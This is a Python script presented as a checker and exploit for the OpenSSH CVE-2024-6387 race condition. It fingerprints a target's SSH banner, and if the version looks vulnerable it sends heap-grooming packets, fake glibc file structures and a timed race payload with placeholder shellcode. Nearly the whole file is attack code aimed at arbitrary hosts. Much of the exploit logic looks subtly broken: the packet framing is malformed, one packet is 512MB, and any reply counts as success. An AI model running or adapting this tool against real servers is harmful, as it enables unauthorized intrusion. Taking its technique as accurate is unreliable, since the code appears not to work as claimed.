import socket
import struct
import time
import errno
import random
import os
import argparse
import ipaddress

# Tamaños máximos de los paquetes
MAX_PACKET_SIZE = 256 * 1024
# Tiempo de gracia para el inicio de sesión en segundos
LOGIN_GRACE_TIME = 120
# Máximo número de intentos de inicio
MAX_STARTUPS = 100

# Define color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
ORANGE = "\033[33m"
ENDC = "\033[0m"

# Define known vulnerable and patched versions
vulnerable_versions = {
    'SSH-2.0-OpenSSH_1', 'SSH-2.0-OpenSSH_2', 'SSH-2.0-OpenSSH_3', 'SSH-2.0-OpenSSH_4.0',
    'SSH-2.0-OpenSSH_4.1', 'SSH-2.0-OpenSSH_4.2', 'SSH-2.0-OpenSSH_4.3', 'SSH-2.0-OpenSSH_4.4',
    'SSH-2.0-OpenSSH_8.5', 'SSH-2.0-OpenSSH_8.6', 'SSH-2.0-OpenSSH_8.7', 'SSH-2.0-OpenSSH_8.8',
    'SSH-2.0-OpenSSH_8.9', 'SSH-2.0-OpenSSH_9.0', 'SSH-2.0-OpenSSH_9.1', 'SSH-2.0-OpenSSH_9.2',
    'SSH-2.0-OpenSSH_9.3', 'SSH-2.0-OpenSSH_9.4', 'SSH-2.0-OpenSSH_9.5', 'SSH-2.0-OpenSSH_9.6',
    'SSH-2.0-OpenSSH_9.7'
}

patched_versions = {
    'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10', 'SSH-2.0-OpenSSH_9.3p1 Ubuntu-3ubuntu3.6',
    'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3', 'SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3.6',
    'SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3', 'SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3',
    'SSH-2.0-OpenSSH_9.7p1 Debian-7'
}

# Alineación de chunks
def CHUNK_ALIGN(s):
    return (s + 15) & ~15

# Posibles direcciones base de glibc (para bypass de ASLR)
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Placeholder de shellcode (reemplazar con shellcode real)
shellcode = b"\x90\x90\x90\x90"

def display_banner():
    banner = f"""
{GREEN}
  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 
  + CVE-2024-6387 CHECK AND XPLOT                              +
  + Created by Fan_tasma                                       +
  + "The supreme art of war is to subdue the enemy without     +
  + fighting." - Sun Tzu                                       +
  + FUnnY                                                      +
  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
{ENDC}
"""
    print(banner)

def resolve_hostname(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None

def get_ssh_banner(ip, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except socket.error:
        return None

def check_vulnerability(address, port, timeout):
    ip = resolve_hostname(address) if not address.replace(".", "").isdigit() else address
    if not ip:
        return ip, port, 'ERROR', " WE COULDN'T CONNECT OR RETRIEVE BANNER"

    banner = get_ssh_banner(ip, port, timeout)
    if not banner:
        return ip, port, 'ERROR', " WE COULDN'T CONNECT OR RETRIEVE BANNER"

    if "SSH-2.0-OpenSSH" in banner:
        if banner in vulnerable_versions and banner not in patched_versions:
            return ip, port, 'VULNERABLE', f"-> Running {banner}"
        else:
            return ip, port, 'SAFE', f"-> Running {banner}"
    else:
        return ip, port, 'UNKNOWN', f"-> SSH version {banner}"

def setup_connection(ip, port):
    
    #Establece una conexión TCP/IP con el servidor remoto.
    
    print("Estableciendo una conexión TCP/IP con el servidor remoto...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        print("Ya casi...")
        # Configura el socket en modo no bloqueante
        sock.setblocking(0)
        return sock
    except socket.error as e:
        print(f"Error al establecer conexión: {e}")
        return None

def send_packet(sock, packet_type, data):
    
    #Envía un paquete al servidor remoto.
    
    print("Enviando un paquete al servidor remoto...")
    packet_len = len(data) + 5
    packet = struct.pack(">I", packet_len) + struct.pack("B", packet_type) + data
    try:
        sock.sendall(packet)
        print("Ya casi...")
    except socket.error as e:
        print(f"Error al enviar paquete: {e}")

def send_ssh_version(sock):
   
    #Envía la versión de SSH al servidor.
    
    print("Enviando la versión de SSH al servidor...")
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    try:
        sock.sendall(ssh_version)
        print("Ya casi...")
    except socket.error as e:
        print(f"Error al enviar versión SSH: {e}")

def receive_ssh_version(sock):
    
    #Recibe la versión de SSH del servidor.
    
    print("Recibiendo la versión de SSH del servidor...")
    try:
        response = sock.recv(256)
        if response:
            print(f"Versión de SSH recibida: {response.decode()}")
            return response
        else:
            print("Conexión cerrada mientras se recibía la versión de SSH")
    except socket.error as e:
        print(f"Error al recibir versión SSH: {e}")
    return None

def send_kex_init(sock):
    
    #Envía el paquete de inicialización de KEX al servidor.
    
    print("Enviando el paquete de inicialización de KEX al servidor...")
    kexinit_payload = bytearray(36)
    send_packet(sock, 20, kexinit_payload)
    print("Ya merito...")

def receive_kex_init(sock):
    
    #Recibe la inicialización de KEX del servidor.
    
    print("Recibiendo la inicialización de KEX del servidor...")
    try:
        response = sock.recv(1024)
        if response:
            print(f"Inicialización KEX recibida ({len(response)} bytes)")
            return response
        else:
            print("Conexión cerrada mientras se recibía la inicialización KEX")
    except socket.error as e:
        print(f"Error al recibir inicialización KEX: {e}")
    return None

def perform_ssh_handshake(sock):
    
   # Realiza el handshake SSH completo.
    
    print("Realizando el handshake SSH completo...")
    send_ssh_version(sock)
    if receive_ssh_version(sock):
        send_kex_init(sock)
        if receive_kex_init(sock):
            print("Un poquito más...")
            return True
    return False

def prepare_heap(sock):
    
    #Prepara el heap del servidor con paquetes específicos.
    
    print("Preparando el heap del servidor con paquetes específicos...")
    # Paquete a: Asigna y libera chunks tcache
    for i in range(10):
        tcache_chunk = b'A' * 64
        send_packet(sock, 5, tcache_chunk)
        print("Ya casi...")

    # Paquete b: Crea 27 pares de huecos grandes (~8KB) y pequeños (320B)
    for i in range(27):
        # Asigna chunk grande (~8KB)
        large_hole = b'B' * 8192
        send_packet(sock, 5, large_hole)
        print("Ya merito...")

        # Asigna chunk pequeño (320B)
        small_hole = b'C' * 320
        send_packet(sock, 5, small_hole)
        print("Un poquito más...")

    # Paquete c: Llena 512MB de memoria con un gran string
    large_string = b'D' * (512 * 1024 * 1024)
    send_packet(sock, 5, large_string)
    print("Ya casi...")

def create_fake_file_structure(data, glibc_base):
   
    #Crea una estructura de archivo falsa en los datos.
    
    offset = 0
    data[offset:offset+4] = struct.pack("<I", 0)  # Placeholder
    offset += 4
    data[offset:offset+4] = struct.pack("<I", glibc_base + 0x1e4c)  # Pointer to _codecvt
    offset += 4
    data[offset:offset+4] = struct.pack("<I", glibc_base + 0x2e4c)  # Pointer to vtable
    offset += 4
    data[offset:offset+4] = struct.pack("<I", glibc_base + 0x3e4c)  # Pointer to vtable
    offset += 4

def time_final_packet(sock, parsing_time):
    
    #Mide el tiempo de respuesta final del servidor.
    
    print("Midiendo el tiempo de respuesta final del servidor...")
    start_time = time.time()
    final_packet = b'Z' * 1024
    send_packet(sock, 5, final_packet)
    while time.time() - start_time < parsing_time:
        try:
            response = sock.recv(1024)
            if response:
                return time.time() - start_time
        except socket.error as e:
            if e.errno != errno.EAGAIN and e.errno != errno.EWOULDBLOCK:
                print(f"Error al recibir respuesta: {e}")
                break
        time.sleep(0.1)
    return None

def measure_response_time(sock, error_type):
    
   # Mide el tiempo de respuesta para diferentes tipos de errores.
    
    print("Midiendo el tiempo de respuesta para diferentes tipos de errores...")
    if error_type == 'packet_disconnect':
        disconnect_packet = b'\x00' * 64
        send_packet(sock, 1, disconnect_packet)
    elif error_type == 'auth_failure':
        auth_failure_packet = b'\x00' * 64
        send_packet(sock, 51, auth_failure_packet)
    elif error_type == 'invalid_packet':
        invalid_packet = b'\xFF' * 64
        send_packet(sock, 99, invalid_packet)
    return time_final_packet(sock, 2)

def create_public_key_packet(packet, size, glibc_base):
   
    #Crea un paquete de clave pública SSH con estructuras de archivos falsas.
    
    print("Creando un paquete de clave pública SSH con estructuras de archivos falsas...")
    packet += struct.pack("<I", 0x10000000)
    packet += struct.pack("<I", 0x20000000)
    packet += struct.pack("<I", glibc_base + 0x1e4c)
    packet += struct.pack("<I", glibc_base + 0x2e4c)
    packet += shellcode.ljust(size - len(packet), b'\x00')
    print("Un poquito más...")
    return packet

def attempt_race_condition(sock, parsing_time, glibc_base):
    
    #Intenta explotar la condición de carrera en el servidor SSH.
   
    print("Intentando explotar la condición de carrera en el servidor SSH...")
    public_key_packet = create_public_key_packet(b'', 8192, glibc_base)
    send_packet(sock, 5, public_key_packet)
    print("Ya casi...")
    return time_final_packet(sock, parsing_time)

def perform_exploit(ip, port):

 #   Realiza la explotación completa intentando varias direcciones base de glibc.
 
    print("Realizando la explotación completa intentando varias direcciones base de glibc...")
    for glibc_base in GLIBC_BASES:
        for attempt in range(5):
            sock = setup_connection(ip, port)
            if not sock:
                print(f"Falló la conexión al servidor {ip}:{port}")
                continue
            if perform_ssh_handshake(sock):
                prepare_heap(sock)
                parsing_time = measure_response_time(sock, 'packet_disconnect')
                if parsing_time:
                    result = attempt_race_condition(sock, parsing_time, glibc_base)
                    if result:
                        print(f"Exploit exitoso con base glibc: {hex(glibc_base)}")
                        print("LISTO, ES LO QUE HAY CHAVO")
                        return
                sock.close()
            else:
                print("Handshake SSH falló")
        print(f"Exploit falló con base glibc: {hex(glibc_base)}")

def main():
    parser = argparse.ArgumentParser(description='Checker y Explotación de CVE-2024-6387')
    parser.add_argument('-a', '--address', required=True, help='Dirección IP o nombre de host del servidor objetivo')
    parser.add_argument('-p', '--port', type=int, default=22, help='Puerto del servidor objetivo (por defecto: 22)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout para conexiones (por defecto: 5 segundos)')
    args = parser.parse_args()

    display_banner()

    ip, port, status, message = check_vulnerability(args.address, args.port, args.timeout)
    if status == 'VULNERABLE':
        print(f"{GREEN}[{status}] {ip}:{port} {message}{ENDC}")
        perform_exploit(ip, port)
    else:
        print(f"{RED}[{status}] {ip}:{port} {message}{ENDC}")

if __name__ == '__main__':
    main()

